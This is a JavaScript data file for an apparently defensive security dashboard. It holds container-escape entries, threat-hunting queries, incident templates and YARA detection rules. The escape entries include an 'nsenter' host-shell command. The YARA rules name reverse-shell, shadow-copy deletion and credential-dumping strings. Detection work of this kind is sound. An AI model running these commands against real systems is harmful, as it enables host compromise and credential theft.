  { name: 'HostPID Namespace', risk: 'High', desc: 'Container sharing host PID namespace can inspect/inject into host processes', exploit: 'nsenter --target 1 --mount -- /bin/bash', detection: 'Monitor hostPID: true in pod specs' },
  { name: 'Writable hostPath Volume', risk: 'High', desc: 'Container with writable hostPath mount can modify host files', exploit: 'Write cron job or SSH key to host filesystem via mounted path', detection: 'Audit hostPath volumes in pod specs, use read-only mounts' },
  { name: 'Kernel Exploit from Container', risk: 'High', desc: 'Exploit kernel vulnerability (DirtyPipe, DirtyCow) from within container', exploit: 'Run kernel exploit binary within container to gain host root', detection: 'Keep host kernel patched, use seccomp profiles to restrict syscalls' },
];

// ============================================================================
// THREAT HUNTING WORKBENCH DATA
// ============================================================================
const HUNT_HYPOTHESES = [
  { id: 'HH-001', name: 'Compromised Service Account', hypothesis: 'An attacker has compromised a service account and is using it for lateral movement during off-hours.', datasources: ['Windows Security Event Logs','Active Directory Logs','Network Flow Data'], queries: ['EventCode=4624 AND LogonType=3 AND Account_Name="svc_*" AND (hour>=20 OR hour<=6)','index=dns query_type=TXT src_ip IN (service_account_ips)'], indicators: ['Service account login outside business hours','Service account authenticating from new endpoints','Unusual network connections from service account hosts'], mitre: ['T1078.002','T1021.002','T1550.002'], status: 'Open' },
  { id: 'HH-002', name: 'Living off the Land (LOL)', hypothesis: 'An APT actor is using legitimate Windows binaries (LOLBins) to execute malicious actions and evade detection.', datasources: ['Sysmon Process Creation','PowerShell Script Block Logging','Command Line Auditing'], queries: ['EventCode=1 AND (Image="*certutil*" OR Image="*mshta*" OR Image="*regsvr32*" OR Image="*rundll32*") AND CommandLine="*http*"','EventCode=4104 AND ScriptBlockText="*DownloadString*"'], indicators: ['certutil downloading files from internet','mshta executing remote HTA','regsvr32 loading remote scriptlet','bitsadmin downloading to temp directory'], mitre: ['T1218','T1059.001','T1197'], status: 'Open' },
  { id: 'HH-003', name: 'DNS-Based Data Exfiltration', hypothesis: 'Sensitive data is being exfiltrated via DNS queries to an attacker-controlled domain.', datasources: ['DNS Query Logs','Network Flow Data','Proxy Logs'], queries: ['index=dns | eval qlen=len(query) | where qlen>50 | stats count avg(qlen) by src_ip query_type','index=dns | stats dc(query) as unique_queries sum(answer_count) by src_ip | where unique_queries>1000'], indicators: ['DNS queries with high entropy subdomains','Unusual volume of TXT record queries','DNS queries to recently registered domains','Large number of unique subdomains per domain'], mitre: ['T1048.003','T1572'], status: 'Open' },
  { id: 'HH-004', name: 'Credential Harvesting Campaign', hypothesis: 'An attacker is conducting a credential harvesting campaign using LSASS dumping, Kerberoasting, or DCSync.', datasources: ['Sysmon Event Logs','Windows Security Logs','EDR Telemetry'], queries: ['EventCode=10 AND TargetImage="*lsass.exe" AND NOT SourceImage IN ("csrss.exe","lsass.exe","MsMpEng.exe")','EventCode=4769 AND Ticket_Encryption_Type=0x17 | stats count by Account_Name | where count>5'], indicators: ['Non-standard process accessing LSASS','Spike in TGS requests with RC4 encryption','4662 events with Replicating Directory Changes','procdump or comsvcs.dll MiniDump of lsass'], mitre: ['T1003.001','T1558.003','T1003.006'], status: 'Open' },
  { id: 'HH-005', name: 'Persistence via Scheduled Tasks', hypothesis: 'An attacker has established persistence using scheduled tasks or cron jobs that execute on a recurring basis.', datasources: ['Windows Task Scheduler Logs','Sysmon','cron logs'], queries: ['EventCode=4698 AND NOT SubjectUserName IN (known_admin_accounts)','EventCode=1 AND ParentImage="*schtasks.exe" AND (CommandLine="*powershell*" OR CommandLine="*cmd*" OR CommandLine="*wscript*")'], indicators: ['Scheduled tasks created by non-admin users','Tasks executing scripts from temp or user directories','Tasks running at unusual intervals (every 1 minute)','Tasks with obfuscated or encoded commands'], mitre: ['T1053.005','T1053.003'], status: 'Open' },
  { id: 'HH-006', name: 'Cloud Resource Hijacking', hypothesis: 'Compromised cloud credentials are being used to spin up cryptocurrency mining instances.', datasources: ['CloudTrail/Activity Logs','Billing Data','VPC Flow Logs'], queries: ['eventName=RunInstances AND NOT sourceIPAddress IN (corporate_ips)','eventName=CreateAccessKey AND NOT sourceIPAddress IN (corporate_ips)'], indicators: ['EC2 instances launched in unusual regions','GPU instances (p3/p4) launched','Sudden billing spike','API calls from foreign IP addresses','New access keys created for existing users'], mitre: ['T1578','T1496'], status: 'Open' },
];

const HUNT_PLAYBOOKS = [
  { name: 'C2 Beacon Detection', steps: ['Export proxy/firewall logs for last 7 days','Run frequency analysis on outbound connections (interval, jitter)','Identify connections with consistent beacon interval (30-90 seconds)','Cross-reference destination IPs/domains against threat intel','Analyze JA3/JA4 fingerprints for known C2 profiles','Check for domain fronting or CDN abuse patterns','Investigate any confirmed beacons on endpoint via EDR'] },
  { name: 'Lateral Movement Detection', steps: ['Pull all logon events (4624) with LogonType 3, 9, 10 for last 30 days','Build authentication graph: source IP -> destination host','Identify new edges (first-time connections between hosts)','Focus on admin-level authentications to non-standard hosts','Check for Pass-the-Hash patterns (LogonType 9, NTLM)','Correlate with Sysmon EID 1 for remote execution tools','Review SMB access to ADMIN$ and C$ shares (5140, 5145)'] },
  { name: 'Data Staging and Exfiltration', steps: ['Identify large file creation events in temp/staging directories','Search for archive creation (7z, zip, rar) by unusual processes','Monitor outbound data volume per host over last 14 days','Flag hosts with outbound transfers > 100MB to single destination','Check for uploads to cloud storage services (S3, GDrive, Mega)','Review DNS query patterns for tunneling indicators','Correlate staging activity with subsequent network transfers'] },
  { name: 'Privilege Escalation Hunt', steps: ['Audit all accounts with admin group membership changes (4728, 4732, 4756)','Review scheduled task creation by non-admin users (4698)','Check for new service installations with suspicious binaries (7045)','Look for UAC bypass attempts (fodhelper, eventvwr, sdclt)','Hunt for token manipulation or impersonation events','Review sudo/su usage on Linux systems','Check for SUID binary abuse on Linux hosts'] },
];

// ============================================================================
// INCIDENT WAR ROOM DATA
// ============================================================================
const WARROOM_TEMPLATES = {
  executive_brief: 'EXECUTIVE INCIDENT BRIEFING\n========================\nIncident ID: [INC-XXXX]\nDate/Time: [DATE TIME UTC]\nSeverity: [P1/P2/P3/P4]\nStatus: [INVESTIGATING | CONTAINED | ERADICATED | RECOVERED]\n\nSITUATION SUMMARY\n-----------------\n[Brief description of what happened, when it was detected, and current status.]\n\nIMPACT ASSESSMENT\n-----------------\nSystems Affected: [NUMBER]\nData at Risk: [DESCRIPTION]\nBusiness Impact: [LOW/MEDIUM/HIGH/CRITICAL]\nCustomer Impact: [YES/NO - DESCRIPTION]\n\nCURRENT ACTIONS\n-----------------\n1. [Action taken]\n2. [Action taken]\n3. [Action in progress]\n\nNEXT STEPS\n-----------------\n1. [Planned action with ETA]\n2. [Planned action with ETA]\n\nESCALATION\n-----------------\nIncident Commander: [NAME]\nTechnical Lead: [NAME]\nNext Briefing: [TIME]',
  technical_report: 'TECHNICAL INCIDENT REPORT\n========================\nIncident ID: [INC-XXXX]\nDate: [DATE]\nClassification: [CLASSIFICATION LEVEL]\n\n1. INCIDENT OVERVIEW\n   - Detection Time: [TIME UTC]\n   - Detection Method: [HOW WAS IT DETECTED]\n   - Initial Indicator: [WHAT TRIGGERED THE ALERT]\n\n2. TECHNICAL ANALYSIS\n   - Attack Vector: [INITIAL ACCESS METHOD]\n   - Vulnerability Exploited: [CVE OR DESCRIPTION]\n   - Malware/Tools Used: [LIST]\n   - MITRE ATT&CK Techniques: [LIST]\n\n3. SCOPE OF COMPROMISE\n   - Systems Compromised: [LIST WITH IPs]\n   - Accounts Compromised: [LIST]\n   - Data Accessed/Exfiltrated: [DESCRIPTION]\n   - Persistence Mechanisms: [LIST]\n\n4. INDICATORS OF COMPROMISE\n   - IP Addresses: [LIST]\n   - Domains: [LIST]\n   - File Hashes: [LIST]\n   - Other: [LIST]\n\n5. CONTAINMENT ACTIONS\n   [LIST OF ACTIONS TAKEN]\n\n6. ERADICATION STEPS\n   [LIST OF STEPS]\n\n7. RECOVERY PLAN\n   [LIST OF RECOVERY STEPS]\n\n8. LESSONS LEARNED\n   [RECOMMENDATIONS]',
  legal_notification: 'LEGAL/REGULATORY BREACH NOTIFICATION\n====================================\nTO: [REGULATORY BODY / DPA]\nFROM: [ORGANIZATION NAME]\nDATE: [DATE]\nREF: Data Breach Notification pursuant to [GDPR Art. 33 / HIPAA / State Law]\n\n1. NATURE OF THE BREACH\n   [Description of the personal data breach]\n\n2. CATEGORIES OF DATA AFFECTED\n   [ ] Names\n   [ ] Email addresses\n   [ ] Physical addresses\n   [ ] Phone numbers\n   [ ] Financial data (credit cards, bank accounts)\n   [ ] Social Security / National ID numbers\n   [ ] Health information (PHI)\n   [ ] Login credentials\n   [ ] Other: [SPECIFY]\n\n3. APPROXIMATE NUMBER OF INDIVIDUALS AFFECTED\n   [NUMBER]\n\n4. DATE OF DISCOVERY\n   [DATE/TIME]\n\n5. ESTIMATED DATE OF BREACH\n   [DATE/TIME or RANGE]\n\n6. MEASURES TAKEN\n   [List of measures taken to address and mitigate]\n\n7. DATA PROTECTION OFFICER CONTACT\n   Name: [NAME]\n   Email: [EMAIL]\n   Phone: [PHONE]',
  containment_checklist: 'CONTAINMENT ACTION CHECKLIST\n============================\n\nIMMEDIATE (0-1 HOUR)\n[ ] Isolate affected systems from network\n[ ] Block attacker IPs at firewall/WAF\n[ ] Disable compromised accounts\n[ ] Revoke compromised API keys/tokens\n[ ] Enable enhanced logging on affected systems\n[ ] Preserve volatile evidence (memory dumps)\n[ ] Activate incident response team\n[ ] Notify incident commander\n\nSHORT-TERM (1-4 HOURS)\n[ ] Reset passwords for compromised accounts\n[ ] Review and block malicious domains at DNS\n[ ] Deploy emergency detection signatures\n[ ] Scan for lateral movement indicators\n[ ] Preserve forensic images of affected systems\n[ ] Check backup integrity\n[ ] Notify legal counsel\n[ ] Notify cyber insurance carrier\n\nMEDIUM-TERM (4-24 HOURS)\n[ ] Complete scope assessment\n[ ] Remove persistence mechanisms\n[ ] Patch exploited vulnerabilities\n[ ] Rotate all potentially compromised credentials\n[ ] Review and update firewall rules\n[ ] Conduct enterprise-wide IOC sweep\n[ ] Begin recovery from clean backups\n[ ] Prepare stakeholder communications',
};

const EVIDENCE_TYPES = [
  { type: 'Disk Image', format: 'E01/DD/VMDK', tool: 'FTK Imager, dd, ewfacquire', notes: 'Full forensic image with hash verification' },
  { type: 'Memory Dump', format: 'DMP/RAW/LIME', tool: 'WinPMEM, LiME, Magnet RAM Capture', notes: 'Volatile data - capture before shutdown' },
  { type: 'Network Capture', format: 'PCAP/PCAPNG', tool: 'Wireshark, tcpdump, NetworkMiner', notes: 'Full packet capture of incident traffic' },
  { type: 'Log Files', format: 'EVTX/LOG/JSON', tool: 'Event Viewer, wevtutil, rsyslog', notes: 'Security, System, Sysmon, Application logs' },
  { type: 'Malware Sample', format: 'ZIP (password protected)', tool: 'Sandbox, IDA Pro, Ghidra', notes: 'Password: "infected" - do not execute on production' },
  { type: 'Registry Hive', format: 'REG/SAM/SYSTEM', tool: 'Registry Explorer, RegRipper', notes: 'SAM, SYSTEM, SOFTWARE, NTUSER.DAT, UsrClass.dat' },
  { type: 'Browser Artifacts', format: 'DB/JSON/LNKK', tool: 'BrowsingHistoryView, Hindsight', notes: 'History, downloads, cache, cookies, sessions' },
  { type: 'Timeline', format: 'CSV/XLSX/JSON', tool: 'Plaso, KAPE, Autopsy', notes: 'Unified timeline from all evidence sources' },
];

// ============================================================================
// STIX/TAXII FEED DATA (for Intel tab expansion)
// ============================================================================
const STIX_FEEDS = [
  { name: 'AlienVault OTX', url: 'https://otx.alienvault.com/taxii2/', type: 'TAXII 2.1', status: 'Active', iocs: 15420, lastSync: '2026-09-13 14:00 UTC', categories: ['IP','Domain','Hash','URL'] },
  { name: 'CISA Known Exploited Vulns', url: 'https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json', type: 'JSON Feed', status: 'Active', iocs: 1120, lastSync: '2026-09-13 12:00 UTC', categories: ['CVE'] },
  { name: 'Abuse.ch URLhaus', url: 'https://urlhaus-api.abuse.ch/v1/', type: 'REST API', status: 'Active', iocs: 84230, lastSync: '2026-09-13 13:30 UTC', categories: ['URL','Domain'] },
  { name: 'Abuse.ch MalwareBazaar', url: 'https://bazaar.abuse.ch/api/', type: 'REST API', status: 'Active', iocs: 234500, lastSync: '2026-09-13 13:45 UTC', categories: ['Hash','Malware'] },
  { name: 'Abuse.ch ThreatFox', url: 'https://threatfox-api.abuse.ch/api/v1/', type: 'REST API', status: 'Active', iocs: 67800, lastSync: '2026-09-13 14:00 UTC', categories: ['IP','Domain','Hash','URL'] },
  { name: 'MISP Default Feeds', url: 'https://www.misp-project.org/feeds/', type: 'MISP JSON', status: 'Active', iocs: 125000, lastSync: '2026-09-13 11:00 UTC', categories: ['IP','Domain','Hash','Email'] },
  { name: 'VirusTotal Livehunt', url: 'https://www.virustotal.com/api/v3/', type: 'REST API', status: 'Configured', iocs: 0, lastSync: 'N/A', categories: ['Hash','URL','Domain'] },
  { name: 'Mandiant Advantage', url: 'https://api.intelligence.mandiant.com/', type: 'REST API', status: 'Configured', iocs: 0, lastSync: 'N/A', categories: ['APT','Malware','CVE'] },
];

const DARKWEB_MENTIONS = [
  { time: '2026-09-13 13:45', source: 'BreachForums', type: 'Data Leak', content: 'New database dump posted: "corp_employees_2026.sql" - 50K records with emails and hashed passwords', severity: 'Critical', relevance: 'High' },
  { time: '2026-09-13 12:20', source: 'Telegram Channel', type: 'Credential Sale', content: 'Selling RDP access to US financial institution - Domain Admin credentials available', severity: 'High', relevance: 'Medium' },
  { time: '2026-09-13 10:15', source: 'Russian Forum', type: 'Zero-Day Sale', content: 'Selling Windows kernel 0-day LPE - PoC available, works on latest Windows 11', severity: 'Critical', relevance: 'High' },
  { time: '2026-09-12 22:30', source: 'BreachForums', type: 'Tool Release', content: 'New evasion tool released: bypasses CrowdStrike Falcon and SentinelOne', severity: 'High', relevance: 'Medium' },
  { time: '2026-09-12 18:45', source: 'Tor Marketplace', type: 'Ransomware-as-a-Service', content: 'LockBit 4.0 affiliate program launched with improved encryption and Linux support', severity: 'High', relevance: 'Medium' },
  { time: '2026-09-12 15:00', source: 'Paste Site', type: 'Leaked Credentials', content: 'Paste containing 10K email:password pairs from unknown source - multiple corporate domains', severity: 'Medium', relevance: 'Medium' },
  { time: '2026-09-12 09:30', source: 'Chinese Forum', type: 'Exploit Trade', content: 'Discussion of new Fortinet FortiGate vulnerability with working PoC - CVE pending', severity: 'High', relevance: 'High' },
  { time: '2026-09-11 20:00', source: 'BreachForums', type: 'Initial Access Broker', content: 'Selling VPN access to healthcare org in Texas - Citrix NetScaler, 500+ endpoints', severity: 'Critical', relevance: 'Medium' },
];


// ============================================================================

// ============================================================================
// YARA RULE TEMPLATES
// ============================================================================
const YARA_RULES = [
  { name: 'CobaltStrike_Beacon', category: 'Malware', description: 'Detects Cobalt Strike Beacon in memory or on disk',
    rule: 'rule CobaltStrike_Beacon {\n  meta:\n    description = "Detects Cobalt Strike Beacon"\n    author = "AEGIS"\n    severity = "Critical"\n  strings:\n    $s1 = "%s as %s\\\\%s: %d" ascii\n    $s2 = "beacon.dll" ascii\n    $s3 = "beacon.x64.dll" ascii\n    $s4 = { 2E 2F 2E 2F 2E 2C 2E }\n    $config = { 00 01 00 01 00 02 ?? ?? 00 02 00 01 00 02 ?? ?? }\n  condition:\n    uint16(0) == 0x5A4D and (2 of ($s*) or $config)\n}' },
  { name: 'Mimikatz_InMemory', category: 'Credential Theft', description: 'Detects Mimikatz strings in process memory',
    rule: 'rule Mimikatz_InMemory {\n  meta:\n    description = "Detects Mimikatz in memory"\n    author = "AEGIS"\n    severity = "Critical"\n  strings:\n    $s1 = "mimikatz" ascii nocase\n    $s2 = "gentilkiwi" ascii\n    $s3 = "sekurlsa::" ascii\n    $s4 = "kerberos::" ascii\n    $s5 = "dpapi::" ascii\n    $s6 = "lsadump::" ascii\n    $s7 = "privilege::debug" ascii\n  condition:\n    3 of them\n}' },
  { name: 'Webshell_Generic', category: 'Web Shell', description: 'Detects common web shell patterns in PHP/ASP/JSP files',
    rule: 'rule Webshell_Generic {\n  meta:\n    description = "Generic web shell detection"\n    author = "AEGIS"\n    severity = "High"\n  strings:\n    $php1 = "eval(base64_decode(" ascii\n    $php2 = "assert(base64_decode(" ascii\n    $php3 = "system($_" ascii\n    $php4 = "passthru($_" ascii\n    $php5 = "shell_exec($_" ascii\n    $asp1 = "eval(Request" ascii nocase\n    $asp2 = "Execute(Request" ascii nocase\n    $jsp1 = "Runtime.getRuntime().exec" ascii\n  condition:\n    any of them\n}' },
  { name: 'Ransomware_Generic', category: 'Ransomware', description: 'Detects common ransomware encryption patterns',
    rule: 'rule Ransomware_Generic {\n  meta:\n    description = "Generic ransomware detection"\n    author = "AEGIS"\n    severity = "Critical"\n  strings:\n    $s1 = "vssadmin delete shadows" ascii nocase\n    $s2 = "wmic shadowcopy delete" ascii nocase\n    $s3 = "bcdedit /set" ascii nocase\n    $s4 = "wbadmin delete catalog" ascii nocase\n    $s5 = "Your files have been encrypted" ascii nocase\n    $s6 = ".onion" ascii\n    $s7 = "bitcoin" ascii nocase\n    $ransom = /pay.*bitcoin|ransom.*decrypt/i\n  condition:\n    uint16(0) == 0x5A4D and (3 of ($s*) or $ransom)\n}' },
  { name: 'Emotet_Dropper', category: 'Malware', description: 'Detects Emotet dropper documents and payloads',
    rule: 'rule Emotet_Dropper {\n  meta:\n    description = "Emotet malware dropper"\n    author = "AEGIS"\n    severity = "High"\n  strings:\n    $doc1 = "Enable Content" ascii wide\n    $doc2 = "Enable Editing" ascii wide\n    $macro1 = "AutoOpen" ascii\n    $macro2 = "Document_Open" ascii\n    $ps1 = "powershell" ascii nocase\n    $ps2 = "-e " ascii\n    $url = /https?:\\/\\/[a-z0-9\\-\\.]+\\.[a-z]{2,}\\//i\n  condition:\n    ($doc1 or $doc2) and ($macro1 or $macro2) and ($ps1 or $ps2 or $url)\n}' },
  { name: 'Reverse_Shell', category: 'Backdoor', description: 'Detects reverse shell payloads in scripts and binaries',
    rule: 'rule Reverse_Shell {\n  meta:\n    description = "Reverse shell detection"\n    author = "AEGIS"\n    severity = "Critical"\n  strings:\n    $bash = "/bin/bash -i >& /dev/tcp/" ascii\n    $nc1 = "nc -e /bin/" ascii\n    $nc2 = "ncat -e /bin/" ascii\n    $py = "socket.socket(socket.AF_INET" ascii\n    $perl = "IO::Socket::INET" ascii\n    $php = "fsockopen(" ascii\n    $ps = "New-Object System.Net.Sockets.TCPClient" ascii\n    $ruby = "TCPSocket.new" ascii\n  condition:\n    any of them\n}' },
  { name: 'Credential_Dumping', category: 'Credential Theft', description: 'Detects credential dumping tools and techniques',
    rule: 'rule Credential_Dumping {\n  meta:\n    description = "Credential dumping tool detection"\n    author = "AEGIS"\n    severity = "Critical"\n  strings:\n    $s1 = "procdump" ascii nocase\n    $s2 = "comsvcs.dll" ascii nocase\n    $s3 = "MiniDump" ascii\n    $s4 = "sekurlsa" ascii\n    $s5 = "ntdsutil" ascii nocase\n    $s6 = "reg save HKLM\\SAM" ascii nocase\n    $s7 = "reg save HKLM\\SYSTEM" ascii nocase\n    $s8 = "ntds.dit" ascii nocase\n    $s9 = "lsass.dmp" ascii nocase\n  condition:\n    2 of them\n}' },
  { name: 'Persistence_Registry', category: 'Persistence', description: 'Detects registry-based persistence mechanisms',
    rule: 'rule Persistence_Registry {\n  meta:\n    description = "Registry persistence detection"\n    author = "AEGIS"\n    severity = "Medium"\n  strings:\n    $s1 = "CurrentVersion\\\\Run" ascii nocase\n    $s2 = "CurrentVersion\\\\RunOnce" ascii nocase\n    $s3 = "Winlogon\\\\Shell" ascii nocase\n    $s4 = "Winlogon\\\\Userinit" ascii nocase\n    $s5 = "Environment\\\\UserInitMprLogonScript" ascii nocase\n    $s6 = "CurrentVersion\\\\Explorer\\\\Shell Folders" ascii nocase\n    $reg = "reg add" ascii nocase\n  condition:\n    $reg and any of ($s*)\n}' },
  { name: 'InfoStealer_Generic', category: 'Stealer', description: 'Detects common information stealer patterns',
    rule: 'rule InfoStealer_Generic {\n  meta:\n    description = "Generic info stealer detection"\n    author = "AEGIS"\n    severity = "High"\n  strings:\n    $chrome = "\\\\Google\\\\Chrome\\\\User Data" ascii\n    $firefox = "\\\\Mozilla\\\\Firefox\\\\Profiles" ascii\n    $edge = "\\\\Microsoft\\\\Edge\\\\User Data" ascii\n    $wallet1 = "wallet.dat" ascii\n    $wallet2 = "\\\\Ethereum\\\\keystore" ascii\n    $ftp = "\\\\FileZilla\\\\recentservers.xml" ascii\n    $rdp = ".rdp" ascii\n    $ssh = "id_rsa" ascii\n    $cred = "Login Data" ascii\n  condition:\n    uint16(0) == 0x5A4D and 3 of them\n}' },
  { name: 'Rootkit_Loader', category: 'Rootkit', description: 'Detects rootkit loading techniques',
    rule: 'rule Rootkit_Loader {\n  meta:\n    description = "Rootkit detection"\n    author = "AEGIS"\n    severity = "Critical"\n  strings:\n    $s1 = "NtLoadDriver" ascii\n    $s2 = "ZwLoadDriver" ascii\n    $s3 = "\\\\Device\\\\" ascii\n    $s4 = "IoCreateDevice" ascii\n    $s5 = "ObRegisterCallbacks" ascii\n    $s6 = "PsSetCreateProcessNotifyRoutine" ascii\n    $drv = ".sys" ascii\n  condition:\n    uint16(0) == 0x5A4D and 3 of ($s*) and $drv\n}' },
];

// ============================================================================
// PORT AND PROTOCOL REFERENCE DATABASE
// ============================================================================
const PORT_REFERENCE = [
  { port: 20, proto: 'TCP', service: 'FTP Data', risk: 'High', notes: 'FTP data transfer - cleartext, disable in favor of SFTP' },
  { port: 21, proto: 'TCP', service: 'FTP Control', risk: 'High', notes: 'FTP control - cleartext credentials, use SFTP/FTPS instead' },
  { port: 22, proto: 'TCP', service: 'SSH', risk: 'Medium', notes: 'Secure Shell - key-based auth recommended, disable password auth' },
  { port: 23, proto: 'TCP', service: 'Telnet', risk: 'Critical', notes: 'Telnet - cleartext, must be disabled entirely' },
  { port: 25, proto: 'TCP', service: 'SMTP', risk: 'Medium', notes: 'Email relay - configure SPF/DKIM/DMARC, restrict relay' },
  { port: 53, proto: 'TCP/UDP', service: 'DNS', risk: 'Medium', notes: 'DNS - restrict zone transfers, enable DNSSEC, monitor for tunneling' },
  { port: 67, proto: 'UDP', service: 'DHCP Server', risk: 'Low', notes: 'DHCP - enable DHCP snooping on switches' },
  { port: 69, proto: 'UDP', service: 'TFTP', risk: 'High', notes: 'Trivial FTP - no authentication, limit to management VLANs' },
  { port: 80, proto: 'TCP', service: 'HTTP', risk: 'Medium', notes: 'HTTP - redirect to HTTPS, implement HSTS' },
  { port: 88, proto: 'TCP/UDP', service: 'Kerberos', risk: 'Medium', notes: 'Kerberos - monitor for Kerberoasting and Golden Ticket attacks' },
  { port: 110, proto: 'TCP', service: 'POP3', risk: 'High', notes: 'POP3 - cleartext, use POP3S (995) or migrate to IMAP' },
  { port: 111, proto: 'TCP/UDP', service: 'RPCBind', risk: 'High', notes: 'RPC portmapper - restrict to trusted networks, disable if unused' },
  { port: 135, proto: 'TCP', service: 'MS-RPC', risk: 'Medium', notes: 'Microsoft RPC endpoint mapper - required for AD, restrict with firewall' },
  { port: 137, proto: 'UDP', service: 'NetBIOS NS', risk: 'High', notes: 'NetBIOS name service - disable if not needed, enables NBNS poisoning' },
  { port: 139, proto: 'TCP', service: 'NetBIOS Session', risk: 'High', notes: 'NetBIOS session - disable SMBv1, restrict to internal networks' },
  { port: 143, proto: 'TCP', service: 'IMAP', risk: 'High', notes: 'IMAP - cleartext, use IMAPS (993)' },
  { port: 161, proto: 'UDP', service: 'SNMP', risk: 'High', notes: 'SNMP - change default community strings, use SNMPv3 with auth' },
  { port: 389, proto: 'TCP', service: 'LDAP', risk: 'Medium', notes: 'LDAP - use LDAPS (636), disable anonymous bind, enable signing' },
  { port: 443, proto: 'TCP', service: 'HTTPS', risk: 'Low', notes: 'HTTPS - enforce TLS 1.2+, configure strong cipher suites' },
  { port: 445, proto: 'TCP', service: 'SMB', risk: 'High', notes: 'SMB - disable SMBv1, require signing, restrict admin shares' },
  { port: 465, proto: 'TCP', service: 'SMTPS', risk: 'Low', notes: 'SMTP over SSL - preferred for email submission' },
  { port: 514, proto: 'UDP', service: 'Syslog', risk: 'Medium', notes: 'Syslog - use TCP with TLS (6514) for reliable encrypted logging' },
  { port: 587, proto: 'TCP', service: 'SMTP Submission', risk: 'Low', notes: 'Email submission with STARTTLS - require authentication' },
  { port: 636, proto: 'TCP', service: 'LDAPS', risk: 'Low', notes: 'LDAP over SSL - preferred over port 389' },
  { port: 993, proto: 'TCP', service: 'IMAPS', risk: 'Low', notes: 'IMAP over SSL - preferred over port 143' },
  { port: 995, proto: 'TCP', service: 'POP3S', risk: 'Low', notes: 'POP3 over SSL - preferred over port 110' },
  { port: 1433, proto: 'TCP', service: 'MSSQL', risk: 'High', notes: 'MS SQL Server - restrict access, require encryption, strong SA password' },
  { port: 1521, proto: 'TCP', service: 'Oracle DB', risk: 'High', notes: 'Oracle database - restrict access, enable encryption' },
  { port: 2049, proto: 'TCP/UDP', service: 'NFS', risk: 'High', notes: 'Network File System - use NFSv4 with Kerberos, enable root_squash' },
  { port: 3306, proto: 'TCP', service: 'MySQL', risk: 'High', notes: 'MySQL - bind to localhost, require SSL, change root password' },
  { port: 3389, proto: 'TCP', service: 'RDP', risk: 'Critical', notes: 'Remote Desktop - never expose to internet, use NLA, require MFA' },
  { port: 5432, proto: 'TCP', service: 'PostgreSQL', risk: 'Medium', notes: 'PostgreSQL - restrict pg_hba.conf, require SSL connections' },
  { port: 5900, proto: 'TCP', service: 'VNC', risk: 'Critical', notes: 'VNC - cleartext by default, never expose externally, use SSH tunnel' },
  { port: 5985, proto: 'TCP', service: 'WinRM HTTP', risk: 'Medium', notes: 'WinRM over HTTP - use HTTPS (5986), restrict to management network' },
  { port: 5986, proto: 'TCP', service: 'WinRM HTTPS', risk: 'Low', notes: 'WinRM over HTTPS - preferred, verify certificate configuration' },
  { port: 6379, proto: 'TCP', service: 'Redis', risk: 'Critical', notes: 'Redis - requires password (requirepass), bind to localhost' },
  { port: 6443, proto: 'TCP', service: 'Kubernetes API', risk: 'High', notes: 'K8s API server - require authentication, use RBAC, restrict access' },
  { port: 8080, proto: 'TCP', service: 'HTTP Alternate', risk: 'Medium', notes: 'Common for web apps and proxies - treat as HTTP, redirect to HTTPS' },
  { port: 8443, proto: 'TCP', service: 'HTTPS Alternate', risk: 'Low', notes: 'Common for management interfaces - restrict access' },
  { port: 8888, proto: 'TCP', service: 'HTTP Proxy', risk: 'Medium', notes: 'Often used for proxy/debugging - should not be externally accessible' },
  { port: 9090, proto: 'TCP', service: 'Prometheus', risk: 'Medium', notes: 'Prometheus metrics - add authentication, restrict network access' },
  { port: 9200, proto: 'TCP', service: 'Elasticsearch', risk: 'Critical', notes: 'Elasticsearch HTTP - enable X-Pack security, restrict network access' },
  { port: 9300, proto: 'TCP', service: 'Elasticsearch Transport', risk: 'High', notes: 'Elasticsearch cluster - restrict to cluster nodes only' },
  { port: 11211, proto: 'TCP/UDP', service: 'Memcached', risk: 'High', notes: 'Memcached - bind to localhost, disable UDP to prevent amplification' },
  { port: 27017, proto: 'TCP', service: 'MongoDB', risk: 'Critical', notes: 'MongoDB - enable authentication, bind to localhost, enable TLS' },
];

// ============================================================================
// FORENSIC ARTIFACT LOCATIONS (Windows & Linux)
// ============================================================================
const FORENSIC_ARTIFACTS = {
  windows: [
    { artifact: 'Event Logs', path: 'C:\\Windows\\System32\\winevt\\Logs\\', tool: 'Event Viewer, EvtxECmd', importance: 'Critical', notes: 'Security.evtx, System.evtx, Application.evtx, Sysmon (if installed)' },
    { artifact: 'Registry Hives', path: 'C:\\Windows\\System32\\config\\', tool: 'Registry Explorer, RegRipper', importance: 'Critical', notes: 'SAM, SECURITY, SOFTWARE, SYSTEM, DEFAULT' },
    { artifact: 'User Registry', path: 'C:\\Users\\<user>\\NTUSER.DAT', tool: 'Registry Explorer', importance: 'High', notes: 'User-specific settings, MRU lists, typed paths' },
    { artifact: 'Prefetch', path: 'C:\\Windows\\Prefetch\\', tool: 'PECmd, WinPrefetchView', importance: 'High', notes: 'Program execution history with timestamps and run count' },
    { artifact: 'Amcache', path: 'C:\\Windows\\AppCompat\\Programs\\Amcache.hve', tool: 'AmcacheParser', importance: 'High', notes: 'Application execution with SHA1 hashes and paths' },
    { artifact: 'ShimCache', path: 'SYSTEM\\CurrentControlSet\\Control\\Session Manager\\AppCompatCache', tool: 'ShimCacheParser', importance: 'High', notes: 'Application compatibility cache - tracks executed programs' },
    { artifact: 'Jump Lists', path: 'C:\\Users\\<user>\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\AutomaticDestinations\\', tool: 'JLECmd', importance: 'Medium', notes: 'Recently accessed files per application' },
    { artifact: 'LNK Files', path: 'C:\\Users\\<user>\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\', tool: 'LECmd', importance: 'Medium', notes: 'Shortcut files with timestamps, target paths, MAC addresses' },
    { artifact: 'Browser History', path: 'C:\\Users\\<user>\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History', tool: 'Hindsight, BrowsingHistoryView', importance: 'High', notes: 'SQLite database with URLs, downloads, visits' },
    { artifact: 'PowerShell Logs', path: 'C:\\Users\\<user>\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt', tool: 'Text editor', importance: 'Critical', notes: 'PowerShell command history for each user' },
    { artifact: 'Scheduled Tasks', path: 'C:\\Windows\\System32\\Tasks\\', tool: 'Task Scheduler, XML parser', importance: 'High', notes: 'XML files defining scheduled tasks - check for persistence' },
